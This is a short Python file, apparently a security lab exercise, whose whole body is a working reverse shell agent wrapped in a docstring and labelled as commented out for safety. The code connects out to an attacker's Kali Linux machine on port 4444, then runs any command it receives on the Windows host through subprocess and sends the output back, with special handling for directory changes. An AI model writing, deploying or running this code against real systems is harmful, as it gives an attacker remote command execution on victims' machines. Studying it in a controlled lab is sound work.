# NOTE: This code is commented out for repository safety and educational demonstration.
# To run this lab, uncomment the lines below in a controlled environment.

""""
import socket
import subprocess
import os

def start_agent():
    # REPLACE THIS with your Kali Linux IP address!
    KALI_IP = "192.X.X.X" 
    PORT = 4444

    # 1. Connect to the Kali Listener
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client.connect((KALI_IP, PORT))
    except Exception as e:
        print(f"Could not connect: {e}")
        return

    while True:
        # 2. Receive the command from Kali
        command = client.recv(1024).decode()
        
        if command.lower() == "exit":
            break

        # 3. Special case for changing directories
        if command.startswith("cd "):
            try:
                os.chdir(command[3:])
                client.send(b"Changed directory to " + os.getcwd().encode())
            except Exception as e:
                client.send(str(e).encode())
            continue

        # 4. Run the command on Windows and get the output
        # 'shell=True' allows us to run standard CMD commands
        output = subprocess.getoutput(command)
        
        # 5. Send the result back to the Attacker
        if not output:
            client.send(b"Command executed (no output).")
        else:
            client.send(output.encode())

    client.close()

if __name__ == "__main__":
    start_agent()

    
    """